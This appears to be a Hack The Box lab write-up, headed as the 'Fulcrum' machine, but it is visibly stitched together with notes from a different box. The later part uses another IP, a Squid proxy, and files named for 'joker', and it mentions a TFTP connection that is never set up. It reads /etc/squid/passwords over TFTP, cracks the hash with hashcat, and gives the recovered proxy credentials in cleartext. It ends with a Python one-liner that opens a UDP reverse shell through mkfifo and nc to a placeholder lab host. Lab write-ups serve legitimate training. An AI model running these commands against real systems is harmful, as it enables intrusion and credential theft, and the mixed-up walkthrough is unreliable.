# 0x00 : Recon

### Network Scan


Important thing here is to spot UDP services<br>
* -sC : --script=safe,intrusive
* -sV : get the running version of the services
* -p- : all 65535 ports
* -T4 : no more than 10ms dynamic delay
* -oA : output logs in all formats

{% highlight bash %}
   nmap -sC -sV -p- -T4 -oA nmap_allports_tcp.fulcrum 10.10.10.62
{% endhighlight %}


> Why all ports ?

### Poking the website

{% highlight url %}
   http://10.10.10.62:4
{% endhighlight %}

Clic the link

{% highlight url %}
   http://10.10.10.62:4/index.php?page=home
{% endhighlight %}

We can try to connect to "home.php". If we can, that would mean that it automaticaly append ".php" to things.

{% highlight url %}
   http://10.10.10.62:4/home.php
{% endhighlight %}

Running dirsearch reveals 3 pages
{% highlight bash %}
   /opt/dirsearch/dirsearch.py -u http://10.10.10.62:4 -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js -x 403,400 --json-report=/home/cristal/Documents/HackTheBox/Fulcrum/dirsearch.fulcrum.json -t 25
{% endhighlight %}

/home.php
/index.php
/upload.php

Moving on to port 80, we've got a Microsoft IIS error while our nmap scan gave us some Ubuntu/Nginx header. Let's keep moving for now.

On port 88, we find a PHPMyAdmin page. But if we try to connect, we are greeted with the #2002 error which means there is no connection to the MySQL server.

# 0x01 : Exploitation

Once connected to the TFTP server we have to "poke" around, in order to determine where we are.
After a few trial and error, we can determine that the root of the TFTP server is the "/" or "root" of the box.
According to our authorizations we can download two interesting files, related to the Squid proxy :

{% highlight bash %}
  get /etc/squid/squid.conf
  get /etc/squid/passwords
{% endhighlight %}

Taking a look at the password file we can identify the hash as "Apache $apr1$ MD5, md5apr1, MD5ARP" according to this [hashcat cheatsheet](https://www.dropbox.com/s/kdklrowv683yq1a/HashcatCheatSheet.v2018.1b%20%282%29.pdf?dl=0).
All we have to do then is pass the hash without the username to hashcat :

{% highlight bash %}
  hashcat -m 1600 hash.txt rockyou.txt
{% endhighlight %}

Now that we've got a username and a password, we can configure our browser with those credentials to connect to that proxy.
Once connected, address 127.0.0.1 reveals an URL shortener kinda app.
Before going further, let's launch a scan in the background :
{% highlight bash %}
  dirb http://127.0.0.1:80 -p 10.10.10.21:3128 -P kalamari:ihateseafood -o dirb.joker.txt
{% endhighlight %}
* -p : specifies the proxy address
* -P : specifies the credentials for that proxy
* -o : save the output to a file
The "list" directory shows the list of previously shortned URL.
The "console" page reveals... a python console !

> determine python version<br>
{% highlight bash %}
  import os;os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u <LAB IP> <PORT> >/tmp/f &").read()
{% endhighlight %}
> python reverse shell UDP ?<br>
